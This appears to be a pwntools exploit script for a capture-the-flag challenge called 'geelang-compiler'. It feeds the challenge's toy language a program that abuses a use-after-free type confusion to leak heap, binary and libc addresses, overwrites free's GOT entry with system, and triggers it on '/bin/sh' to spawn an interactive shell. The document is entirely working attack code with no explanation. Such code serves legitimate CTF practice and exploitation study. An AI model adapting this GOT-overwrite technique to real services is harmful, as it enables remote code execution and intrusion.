from pwn import *

PROGNAME   = "./chal/geelang-compiler"
REMOTEIP   = "8.8.8.8"
REMOTEPORT = 9999

if args.REMOTE:
    p = remote(REMOTEIP, REMOTEPORT)
    elf = ELF(PROGNAME)
else:
    p = process(PROGNAME)
    elf = p.elf
    libc = ELF("/usr/lib/libc-2.29.so")
pause()
GETSHELL = '''
INT a 99
DEL a
BOX b 1 # Create boxed/unboxed overlap
PRINT a # Leak Heap chunk

INT z 24
SUB a z
PRINT b # Leak Binary (print_int) Address


SET z {}
MOV a b
SUB a z # Offset to binary base
PRINT a

SET z {}
ADD a z # Offset to free GOT entry

PRINT a
PRINT b # Leak free@GOT

INT SYSTEM 0
SET z {}
MOV SYSTEM b
SUB SYSTEM z # Offset to libc base

SET z {}
ADD SYSTEM z # Offset to system
PRINT SYSTEM

MOV b SYSTEM

SET a {} # /bin/sh
DEL a

END
'''.format(elf.symbols["print_int"],
        elf.got["free"],
        libc.symbols["free"],
        libc.symbols["system"],
        u64("/bin/sh\x00")
        )
print GETSHELL
pause()
p.sendline(GETSHELL)

p.interactive()

